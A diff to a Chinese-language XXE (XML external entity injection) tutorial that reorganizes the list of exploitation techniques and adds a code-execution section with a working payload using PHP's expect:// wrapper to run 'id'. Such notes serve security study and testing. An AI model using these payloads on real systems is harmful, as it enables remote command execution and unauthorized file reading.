@@ -4,14 +4,9 @@
 XXE(XML External Entity),即是XML外部实体注入攻击.漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。   
 关键在DTD的引用。   
 ```
-\\实例代码
-<?xml version="1.0"?>//这一行是 XML 文档定义
-<!DOCTYPE message [
-<!ELEMENT message (receiver ,sender ,header ,msg)>
-<!ELEMENT receiver (#PCDATA)>
-<!ELEMENT sender (#PCDATA)>
-<!ELEMENT header (#PCDATA)>
-<!ELEMENT msg (#PCDATA)>
+DOCTYPE(声明)    
+ENTITY(实体声明)        
+SYSTEM PUBLIC(外部资源申请)     
 ```
 DTD(The document type definition)，即是文档类型定义，可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。   
 ```
@@ -21,12 +16,13 @@ DTD(The document type definition)，即是文档类型定义，可定义合法�
 用 &实体名; 引用的实体   
 用 % 实体名，引用参数实体，只能在 DTD 中使用 %实体名;
 
-### 读取文件有异常字符报错
+### CDATA-读取文件有异常字符报错
 有些内容可能不想让解析引擎解析执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 <> & 或者
 " 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记   
 ```
+\\XML解析忽略
 <![CDATA[
-XXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXX 
 ]]>
 ```
 #### Payload
@@ -58,11 +54,14 @@ evil.dtd
 ## XXE漏洞利用
 前提条件：允许外部实体引用。   
 按服务端语言有PHP(libxml)、JAVA、JAVA(Android)一般解析函数都是默认不开启的、Python、libxml2。   
-漏洞利用方法分：   
-- 回显读取文件   
-- 不带回显读取文件-OOB(Out of Band）    
-- 报错回显读取文件-XXE Base Error   
-- 文件上传-jar协议   
+漏洞利用方法分： 
+- 文件操作：
+  0x01 回显读取文件   
+  0x02 不带回显读取文件-OOB(Out of Band）    
+  0x03 报错回显读取文件-XXE Base Error   
+- 0x04 远程执行
+- 0x05 文件上传-jar协议   
+
 ### 0x01回显读取文件
 #### payload   
 ```
@@ -178,7 +177,20 @@ ubuntu系统自带的/usr/share/yelp/dtd/docbookx.dtd 包含%ISOamso
     %para;
 ]>
 ```
-### 文件上传-jar协议 
+
+### 0x04 代码执行
+PHP语言环境。    
+这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当/开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令：  
+```
+<?xml version="1.0"?>
+<!DOCTYPE GVI [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "expect://id" >]>
+<root>
+  <name>&xxe;</name>
+</root>
+```
+
+### 0x05 文件上传-jar协议 
 这篇文章：[一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)其中实验七有详细利用方法。   
 ### Tips
  - java 还支持一个 netdoc 协议，能完成列目录的功能   
